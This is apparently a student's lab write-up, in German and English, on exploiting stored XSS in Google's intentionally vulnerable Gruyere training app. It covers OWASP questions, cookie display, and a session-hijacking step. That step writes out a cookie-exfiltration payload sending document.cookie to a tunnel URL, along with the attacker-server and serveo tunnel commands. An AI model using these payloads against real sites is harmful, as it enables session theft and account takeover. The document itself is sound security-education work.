# M183-Applikationssicherheit-implementieren
Lernziele
- Sie können die wichtigsten OWASP-Ressourcen (Top 10, Proactive Controls, ASVS) benennen und deren Zweck erklären.
- Sie können eine XSS-Schwachstelle (Stored und Reflected) in einer laufenden Applikation ausnutzen.
- Sie können erklären, warum Session-Cookies ein lohnenswertes Angriffsziel sind.
- Sie können einen Session-Hijacking-Angriff mit zwei Benutzern durchspielen.
- Sie können für jede ausgenutzte Schwachstelle die passende Gegenmassnahme benennen.
***
- **Gruyere**: Small web application for publishing text snippets and storing files, with intentional security bugs including XSS, XSRF, information disclosure, denial of service, and remote code execution. Google codelab for learning web application exploits and defenses; supports black-box and white-box hacking.
- **XSS**: Cross-Site Scripting, a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users, potentially leading to data theft, session hijacking, or defacement of the website.
### A) Gruyere starten und Accounts erstellen (20%)
- UID: 545404200497371604692871509509367347540 ![img_2.png](img_2.png)
- Users
  - angreifer-zakria: gugus1 ![img.png](img.png)
  - verteidiger-zak: gugus2 ![img_1.png](img_1.png) 
### B) Stored XSS in Gruyere
#### B1 – DOM-Manipulation als Proof of Concept
- injects script when creating new snippet: `<img src="x" onerror="document.querySelector('.menu').style.backgroundColor = 'red'">` ![img_3.png](img_3.png) ![img_4.png](img_4.png) ![img_5.png](img_5.png)
- Q&A
  - *Warum konnte dieser Payload die Sicherheitsprüfung des Browsers umgehen, obwohl <script> blockiert wird?*
  - It took advantage of the [`onerror` event handler](https://www.w3schools.com/Jsref/event_onerror.asp), wich is triggered when an error occurs while loading an external file. Since I'm asking for an image that's most likely not to exist, the `onerror` event will be triggered, allowing the execution of the JavaScript code.
  - *Was bedeutet es für die Sicherheit, dass der Payload auch im Browser des Verteidigers ausgeführt wird?*
  - It means that the attacker can manipulate the victim's browser, potentially leading to data theft or session hijacking of the website.
  - *Welche OWASP Top 10 Kategorie (2025) beschreibt Stored XSS? Nennen Sie Nummer und Bezeichnung.*
  - [A05:2025 Injection](https://owasp.org/Top10/2025/A05_2025-Injection/)
  - *Was hätte die Applikation tun müssen, damit dieser Payload harmlos bleibt? (Stichwort: Output Encoding)*
  - The application should have properly encoded the output, especially for special characters like `<`, `>`, and `&`. This would prevent the browser from interpreting the input as executable code, making it harmless. [output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding)
#### B2 – Cookies: Was sie sind und warum sie gefährlich sind
- Cookie
  - GRUYERE: 45075654|verteidiger-zak||author
- Inject script `<img src="x" onerror="this.insertAdjacentHTML('afterend','<div style=background:#c00;color:#fff;padding:8px;margin:4px 0>Sichtbares Cookie: ' + document.cookie + '</div>')">` ![img_6.png](img_6.png)
- Q&A
- *Laden Sie die Seite neu. Wessen Cookie wird im roten Kasten angezeigt – Ihrer oder der des Verteidigers?*  
- The attacker's cookie is displayed in the red box, because the script is executed in the attacker's browser. ![img_7.png](img_7.png)
- *Wechseln Sie zum Fenster des Verteidigers und navigieren Sie zur Startseite. Welches Cookie erscheint dort?* ![img_8.png](img_8.png)
- *Was kann ein Angreifer tun, wenn er den Session-Cookie eines anderen Benutzers kennt?*
- If an attacker knows the session cookie of another user, they can impersonate that user by using the stolen cookie. They can do this by setting their own browser's cookie to the stolen value, allowing them to access the victim's account.
- *Was bewirkt das HttpOnly-Flag bei einem Cookie und wie schützt es vor diesem Angriff?*
-  When this flag is present, browsers that support it keep the cookie out of JavaScript APIs such as document.cookie. Since scripts running in the browser are not able to read its value, this makes it harder for many XSS attacks to steal session cookies or other sensitive data stored in cookies. [httpOnly](https://owasp.org/www-community/HttpOnly)
- *Warum ist es gefährlich, Session-Cookies im localStorage statt in einem HttpOnly-Cookie zu speichern?*
- Storing session cookies in localStorage is dangerous because localStorage is accessible via JavaScript
#### B3 – Session-Hijacking: Cookie-Exfiltration zum Angreifer-Server
- Generate SHH key pair. ![img_9.png](img_9.png)
- Passkey: gugus
- Create Security Group: ![img_10.png](img_10.png)
- Cloud Init script:
```yaml
#cloud-config
users:
  - name: ubuntu
    groups: docker
    sudo: ALL=(ALL) NOPASSWD:ALL
    shell: /bin/bash
    ssh_authorized_keys:
      - ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILLefU5eUlSveKv0/BnmIGN4j9le3QpG0NIAzReH6T92 m183-shahid-tbz

packages:
  - docker.io

runcmd:
  - systemctl start docker
  - systemctl enable docker
```
- Public IPv4 (will change on every reboot, should use Elastic IP): `35.153.157.12`
- Connect to EC2 instance: ![img_11.png](img_11.png)
- Testing Docker: ![img_12.png](img_12.png)
- Open Port:9000 in security group `m183-sg`. ![img_13.png](img_13.png)
- Start Attack Server (SSH-Terminal 1)
  - run script: `python3 -m http.server 9000` → simple Python-HTTP-Server running on port 9000
- Start HTTPS-Tunnel Server (SSH-Terminal 2)
  - run script: `ssh -R 80:localhost:9000 serveo.net` → binds all incoming traffic on port 80 of serveo.net to port 9000 of the attacker's EC2 instance
  - copy log: `Forwarding HTTP traffic from https://59614f9c88d865c5-35-153-157-12.serveousercontent.com`
- Create Snippet on Attackers account on Gruyere:
  - enter this into input field: `<img src="x" onerror="new Image().src='<https://59614f9c88d865c5-35-153-157-12.serveousercontent.com>/?c='+encodeURIComponent(document.cookie)">` → now this runs a GET request to the attacker's server with the cookie as url parameter, and the user won't notice this.
  - It didn't log anything since the request kept failing, I believe it's due to my Firewall blocking the outgoing request